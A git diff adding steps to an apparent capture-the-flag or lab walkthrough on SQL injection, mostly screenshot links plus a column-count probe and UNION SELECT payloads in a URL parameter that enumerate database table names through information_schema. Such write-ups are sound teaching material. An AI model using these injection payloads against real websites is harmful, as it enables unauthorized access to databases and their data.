@@ -98,7 +98,8 @@ Please connect to our network before deploying the machine.</p>
 
 <br>
 
-![image](https://github.com/user-attachments/assets/4a029447-c6b2-46ae-8fa6-8e31bb09ca2c)
+![image](https://github.com/user-attachments/assets/68828109-5c37-4ac9-86ea-12affc334438)
+
 
 <br>
 
@@ -112,6 +113,58 @@ But guess what?  .... with <code>' or 1=1 ORDER BY 1,2,3,4,5,6</code> the output
 
 
 ![image](https://github.com/user-attachments/assets/62412608-4a88-4c2e-8efd-37ef9247a743)
+
+<br>
+
+<p>So we can conclude that thre are <code>5</code> columns!  Leté try <code>UNION</code></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/097118f6-9e37-45be-bca5-f53034b80bd6)
+
+<br>
+
+
+<p>Buy, Buy, Buy</p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/d3bfe821-a1a6-49f8-a417-88908768be4b)
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/a9df154f-133b-4596-b60d-222bd010ad61)
+
+<br>
+
+<pre><code>?id=5%20union%20select%201,group_concat(table_name),3,4,5%20from%20information_schema.tables</code></pre>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/a8f44e9b-199a-4fd7-a26b-80c9d14451bf)
+
+<br>
+
+<pre><code>?id=5 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema = database()</code></pre>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/3d5d88a9-c949-4c3c-806d-5c51db1e747d)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
